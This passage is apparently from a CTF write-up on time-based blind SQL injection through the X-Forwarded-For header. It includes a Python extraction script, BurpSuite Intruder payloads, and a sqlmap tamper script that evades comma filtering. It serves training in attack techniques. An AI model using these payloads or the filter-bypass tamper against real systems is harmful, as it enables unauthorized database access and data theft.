class="hljs-string">&quot;sangebaimao&quot;</span>;<br> <br><span class="hljs-variable">$connect</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to connect&quot;</span>);<br> <br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$db</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to select database&quot;</span>);<br> <br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;your ip is :&#x27;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into client_ip (ip) values (&#x27;<span class="hljs-subst">$ip</span>&#x27;)&quot;</span>;<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>  <br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>所以这不能利用真值注入，报错注入等，只能尝试基于时间的注入。</p><p><strong>入了坑，要懂得跳出来。  当设想的程序逻辑跟试验结果不符合，就要尝试另外的设想、思路。</strong></p><p>做这道题，用三种方法：</p><blockquote><ol><li><p>用Python脚本跑。</p></li><li><p>利用BurpSuite进行基于时间的盲注。</p></li><li><p>自己写tamper来使用sqlmap绕过 服务端对逗号的过滤 进行time-based注入（修改queries.xml这个方法不行）</p></li></ol></blockquote><h3 id="0x01-用Python脚本跑"><a href="#0x01-用Python脚本跑" class="headerlink" title="0x01 用Python脚本跑"></a>0x01 用Python脚本跑</h3><p>事先确定了flag存储在flag表的flag字符里，且flag的长度为32，</p><p>一个简陋的脚本：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>url=<span class="hljs-string">&quot;http://xxx&quot;</span><br>guess=string.lowercase + string.uppercase + string.digits<br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):<br>   <span class="hljs-keyword">for</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">in</span> guess:<br>     headers=&#123;<span class="hljs-string">&quot;x-forwarded-for&quot;</span>:<span class="hljs-string">&quot;xx&#x27;+&quot;</span>+<span class="hljs-string">&quot;(select case when (substring((select flag from flag ) from %d for 1 )=&#x27;%s&#x27;) then sleep(5) else 1 end ) and &#x27;1&#x27;=&#x27;1&quot;</span> %(i,<span class="hljs-built_in">str</span>)&#125;<br>     <span class="hljs-keyword">try</span>: <br>         res=requests.get(url,headers=headers,timeout=<span class="hljs-number">4</span>)<br>     <span class="hljs-keyword">except</span> requests.exceptions.ReadTimeout, e:<br>         flag = flag + <span class="hljs-built_in">str</span><br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;flag:&quot;</span>, flag<br>         <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;result:&#x27;</span> + flag<br></code></pre></div></td></tr></table></figure><h3 id="0x02-利用BurpSuite进行基于时间的盲注"><a href="#0x02-利用BurpSuite进行基于时间的盲注" class="headerlink" title="0x02 利用BurpSuite进行基于时间的盲注"></a>0x02 利用BurpSuite进行基于时间的盲注</h3><p>参考：<a href="https://depthsecurity.com/blog/blind-sql-injection-burpsuite-like-a-boss">https://depthsecurity.com/blog/blind-sql-injection-burpsuite-like-a-boss</a></p><p>下面是几个要点：</p><h4 id="1-设置代理"><a href="#1-设置代理" class="headerlink" title="1.设置代理"></a>1.设置代理</h4><p>每次开BurpSuite这个工具都要设置代理，这是很麻烦的。通常使用浏览器的设置选项设置代理会比较方便点。</p><p>如在Chrome浏览器设置代理：</p><p><img src="ctf_who_are_you_3.png" alt="ctf_who_are_you_3.png"></p><p>更方便的方法是，使用插件。如在Chrome浏览器中使用SwitchyOmega插件来切换代理。这里就不说SwitchyOmega的使用了。</p><h4 id="2-BurpSuite如何判断是否超时"><a href="#2-BurpSuite如何判断是否超时" class="headerlink" title="2.BurpSuite如何判断是否超时"></a>2.BurpSuite如何判断是否超时</h4><p>首先有个问题，我们如何在BurpSuite得知后台因为SQL的执行而有延迟产生。这需要一点设置。</p><p>Options-&gt;Connections-&gt;Tiimeouts-&gt;Normal这一空 改成你想要的超时时间（默认为120秒）。</p><p><img src="ctf_who_are_you_4.png" alt="ctf_who_are_you_4.png"></p><p>在进行Intruder攻击时，如果连接超时，则状态码和length一栏为空。由此可以判断连接是否超时。</p><p>需要注意的是：在开始Intruder攻击前，需要把Intruder-&gt;Options-&gt;Request Engine-&gt;Number of threads的<strong>线程数改成1</strong>，否则将导致前一个请求的延时造成后一个请求延时，这就使判断不正确了。</p><h4 id="3-使用BurpSuite进行HTTP头注入需要注意什么"><a href="#3-使用BurpSuite进行HTTP头注入需要注意什么" class="headerlink" title="3.使用BurpSuite进行HTTP头注入需要注意什么"></a>3.使用BurpSuite进行HTTP头注入需要注意什么</h4><ol><li>在Proxy-&gt;Intercept-&gt;Raw修改数据包内容时：当这个请求没有POST参数，要求最后空两行，否则数据包将发送不成功；当这个请求有POST参数，要求headers与POST参数之间空一行。</li></ol><p><img src="ctf_who_are_you_5.png" alt="ctf_who_are_you_5.png"></p><p>   建议在Proxy-&gt;Intercept-&gt;headers一栏里修改请求包的Headers。</p><ol start="2"><li>在开始Intruder攻击前，Intruder-&gt;Payloads-&gt;Payload Encoding的URL-encode these characters的勾要去掉，即不让BurpSuite对payload进行URL编码。</li></ol><h4 id="4-BurpSuite-Intruder的Attack-Type"><a href="#4-BurpSuite-Intruder的Attack-Type" class="headerlink" title="4.BurpSuite Intruder的Attack Type"></a>4.BurpSuite Intruder的Attack Type</h4><p>本次time-based注入需要选择Cluster bome这个Attack Type</p><p>有关BurpSuite的Attack Type参考：<a href="http://blog.csdn.net/u012804180/article/details/52015224">http://blog.csdn.net/u012804180/article/details/52015224</a></p><p>下面是具体的攻击步骤：</p><p>先设定Burpsuite的Timeout为4秒：</p><p><img src="ctf_who_are_you_6.png" alt="ctf_who_are_you_6.png"></p><p>抓取数据包，并发送到Repeater。</p><p>事先验证flag记录的长度，用以下语句来注入：</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">length</span>(flag) <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>)=<span class="hljs-number">32</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></div></td></tr></table></figure><p><img src="ctf_who_are_you_7.png" alt="ctf_who_are_you_7.png"></p><p>当点击Repeter的Go按钮，等待了约五秒，Go按钮从不可按状态转为可按状态，cancel按钮从可按状态转为不可按状态，Reponse没有任何返回，且Burpsuite 的Alerts模块里新增一个Timeout的提示。就表明后台延时了5秒。</p><p>这就可以确定其长度为32了。</p><p>把数据包发送到Intruder。</p><p>构造注入语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-keyword">select</span> ord(substring(flag <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>) = <span class="hljs-number">2</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></div></td></tr></table></figure><p>其中，表名flag和字段名flag存在可以由以下注入语句来确认：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and exists(select flag from flag) and sleep(<span class="hljs-number">5</span>) and &#x27;<span class="hljs-number">1</span>&#x27; = &#x27;<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>在两处位置add $，并设置Attack Type为Cluster bomb：</p><p><img src="ctf_who_are_you_8.png" alt="ctf_who_are_you_8.png"></p><p>设置Payload1：</p><p><img src="ctf_who_are_you_9.png" alt="ctf_who_are_you_9.png"></p><p>设置Payload2：</p><p><img src="ctf_who_are_you_10.png" alt="ctf_who_are_you_10.png"></p><p>把Payload1和Payload2的URL-encode取消掉：</p><p><img src="ctf_who_are_you_11.png" alt="ctf_who_are_you_11.png"></p><p>设置线程数为1：</p><p><img src="ctf_who_are_you_12.png" alt="ctf_who_are_you_12.png"></p><p>万事具备，开始攻击。Inturder-&gt;Start Attack</p><p><img src="ctf_who_are_you_13.png" alt="ctf_who_are_you_13.png"></p><p>像这些，Status一栏跟Length一栏为空的请求就是超时的。</p><p>利用这些就可以得到flag的ASCII值，再转码就得到flag！</p><h3 id="0x03-使用sqlmap绕过-服务端对逗号的过滤"><a href="#0x03-使用sqlmap绕过-服务端对逗号的过滤" class="headerlink" title="0x03 使用sqlmap绕过 服务端对逗号的过滤"></a>0x03 使用sqlmap绕过 服务端对逗号的过滤</h3><h4 id="1-使用sqlmap进行HTTP头注入"><a href="#1-使用sqlmap进行HTTP头注入" class="headerlink" title="1.使用sqlmap进行HTTP头注入"></a>1.使用sqlmap进行HTTP头注入</h4><p>首先，得知道怎么用sqlmap进行HTTP头注入。</p><p>方法：</p><p>利用-r 参数指定存储着数据包的文件，并用*号来告诉sqlmap哪里是注入点。</p><p>这道题的数据包内容是：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /web/wonderkun/index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ctf5.shiyanbar.com<br><span class="hljs-attribute">Proxy</span>-Connection: keep-alive<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">47</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2526</span>.<span class="hljs-number">111</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">1</span>*<br><span class="hljs-attribute">Referer</span>: http://www.shiyanbar.com/ctf/<span class="hljs-number">1941</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, sdch<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure><p>另外，User-Agent、Cookie、Referer的值中可能有*号，这会让sqlmap去测试这些我们不需要测试的地方，这时，可以使用<code>--skip SKIP</code>参数来指示哪里不需要被测试，如：</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">--skip</span>=<span class="hljs-string">&quot;user-agent,referer&quot;</span><br></code></pre></div></td></tr></table></figure><h4 id="2-尝试修改queries文件（不可行）"><a href="#2-尝试修改queries文件（不可行）" class="headerlink" title="2.尝试修改queries文件（不可行）"></a>2.尝试修改queries文件（不可行）</h4><p>文件是在<code>sqlmap/xml</code>目录下的queries.xml</p><p>可以说这个文件<strong>存储着sqlmap构造SQL语句的模板</strong>，其部分内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- MySQL --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;MySQL&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">cast</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;CAST(%s AS CHAR)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">length</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;CHAR_LENGTH(%s)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">isnull</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;IFNULL(%s,&#x27; &#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">delimiter</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;,&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">limit</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;LIMIT %d,%d&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">limitregexp</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;\s+LIMIT\s+([\d]+)\s*\,\s*([\d]+)&quot;</span> <span class="hljs-attr">query2</span>=<span class="hljs-string">&quot;\s+LIMIT\s+([\d]+)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">limitgroupstart</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;1&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">limitgroupstop</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;2&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">limitstring</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot; LIMIT &quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">order</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;ORDER BY %s ASC&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">count</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;COUNT(%s)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">comment</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;-- &quot;</span> <span class="hljs-attr">query2</span>=<span class="hljs-string">&quot;/*&quot;</span> <span class="hljs-attr">query3</span>=<span class="hljs-string">&quot;#&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">substring</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;MID((%s),%d,%d)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">concatenate</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;CONCAT(%s,%s)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">case</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hex</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;HEX(%s)&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">inference</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;ORD(MID((%s),%d,1))&gt;%d&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">banner</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;VERSION()&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">current_user</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;CURRENT_USER()&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">current_db</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;DATABASE()&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">hostname</span> <span class="hljs-attr">query</span>=<span class="hljs-string">&quot;@@HOSTNAME&quot;</span>/&gt;</span><br> ...<br></code></pre></div></td></tr></table></figure><p>我们可以修改<code>&lt;isnull query=&quot;IFNULL(%s,&#39; &#39;)&quot;/&gt;</code>一项为<code>&lt;isnull query=&quot;(SELECT %s)&quot;&gt;</code> ，这就避免了使用逗号，还有<code>&lt;inference query=&quot;ORD(MID((%s),%d,1))&gt;%d&quot;/&gt;</code>可以改为<code>&lt;inference query=&quot;ORD(MID((%s) from %d for 1))&gt;%d&quot;/&gt;</code>，诸如此，等等。</p><p>不过，为什么这个方法绕不过服务器对逗号的过滤呢？因为sqlmap要使用IF函数，这个函数中有逗号，而且，queries文件里不可以针对IF函数来修改。</p><p>参考乌云文章：SQLMAP进阶使用  <a href="http://drops.wooyun.org/tips/5254">http://drops.wooyun.org/tips/5254</a></p><h4 id="3-自己写tamper"><a href="#3-自己写tamper" class="headerlink" title="3.自己写tamper"></a>3.自己写tamper</h4><p>参考下sqlmap/tamper/目录下的文件，就可以自己写出简单的tamper。</p><p>写tamper的思路也很简单：把sqlmap会用到逗号的语句用其他不含有逗号的语句替代。</p><p>自己写了一个很简陋的tamper，名为commalessmysql.py，放在sqlmap/tamper目录下。（这个脚本只适用MySQL）：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Writed by Ovie 2016-12-05</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.LOWEST<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Replaces some instances with something whthout comma </span><br><span class="hljs-string"></span><br><span class="hljs-string">    Requirement:</span><br><span class="hljs-string">        * MySQL</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Tested against:</span><br><span class="hljs-string">        * MySQL 5.0</span><br><span class="hljs-string">            </span><br><span class="hljs-string">    </span><br><span class="hljs-string">    &gt;&gt;&gt; tamper(&#x27;ISNULL(TIMESTAMPADD(MINUTE,7061,NULL))&#x27;)</span><br><span class="hljs-string">    &#x27;ISNULL(NULL)&#x27;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    &gt;&gt;&gt; tamper(&#x27;MID(VERSION(), 2, 1)&#x27;)</span><br><span class="hljs-string">    &#x27;MID(VERSION() FROM 2 FOR 1)&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; tamper(&#x27;IF(26=26,0,5)&#x27;)</span><br><span class="hljs-string">    &#x27;CASE WHEN 26=26 THEN 0 ELSE 5 END&#x27;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    &gt;&gt;&gt; tamper(&#x27;IFNULL(NULL,0x20)&#x27;)</span><br><span class="hljs-string">    &#x27;CASE WHEN NULL=NULL THEN 0x20 ELSE NULL END&#x27;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    &gt;&gt;&gt; tamper(&#x27;LIMIT 2, 3&#x27;)</span><br><span class="hljs-string">    &#x27;LIMIT 3 OFFSET 2&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">commalessif</span>(<span class="hljs-params">payload</span>):<br>        <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> payload.find(<span class="hljs-string">&quot;IF&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">while</span> payload.find(<span class="hljs-string">&quot;IF(&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>                index = payload.find(<span class="hljs-string">&quot;IF(&quot;</span>)<br>                depth = <span class="hljs-number">1</span><br>                comma1, comma2, end = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IF(&quot;</span>), <span class="hljs-built_in">len</span>(payload)):<br>                    <span class="hljs-keyword">if</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> comma1:<br>                        comma1 = i<br>                        <br>                    <span class="hljs-keyword">elif</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-keyword">and</span> comma1:<br>                        comma2 = i<br><br>                    <span class="hljs-keyword">elif</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                        end = i<br>                        <span class="hljs-keyword">break</span><br><br>                    <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;(&#x27;</span>:<br>                        depth += <span class="hljs-number">1</span><br><br>                    <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                        depth -= <span class="hljs-number">1</span><br><br>                <span class="hljs-keyword">if</span> comma1 <span class="hljs-keyword">and</span> comma2 <span class="hljs-keyword">and</span> end:<br>                    _ = payload[index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IF(&quot;</span>):comma1]<br>                    __ = payload[comma1 + <span class="hljs-number">1</span>:comma2]<br>                    ___ = payload[comma2 + <span class="hljs-number">1</span>:end]<br>                    newVal = <span class="hljs-string">&quot;CASE WHEN %s THEN %s ELSE %s END&quot;</span> % (_, __, ___)<br>                    payload = payload[:index] + newVal + payload[end + <span class="hljs-number">1</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">break</span><br>                    <br>        <span class="hljs-keyword">return</span> payload<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">commalessifnull</span>(<span class="hljs-params">payload</span>):<br>        <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> payload.find(<span class="hljs-string">&quot;IFNULL&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">while</span> payload.find(<span class="hljs-string">&quot;IFNULL(&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>                index = payload.find(<span class="hljs-string">&quot;IFNULL(&quot;</span>)<br>                depth = <span class="hljs-number">1</span><br>                comma, end = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IFNULL(&quot;</span>), <span class="hljs-built_in">len</span>(payload)):<br>                    <span class="hljs-keyword">if</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;,&#x27;</span>:<br>                        comma = i<br><br>                    <span class="hljs-keyword">elif</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                        end = i<br>                        <span class="hljs-keyword">break</span><br><br>                    <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;(&#x27;</span>:<br>                        depth += <span class="hljs-number">1</span><br><br>                    <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                        depth -= <span class="hljs-number">1</span><br><br>                <span class="hljs-keyword">if</span> comma <span class="hljs-keyword">and</span> end:<br>                    _ = payload[index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IFNULL(&quot;</span>):comma]<br>                    __ = payload[comma + <span class="hljs-number">1</span>:end].lstrip()<br>                    newVal = <span class="hljs-string">&quot;CASE WHEN %s=NULL THEN %s ELSE %s END&quot;</span> % (_, __, _)<br>                    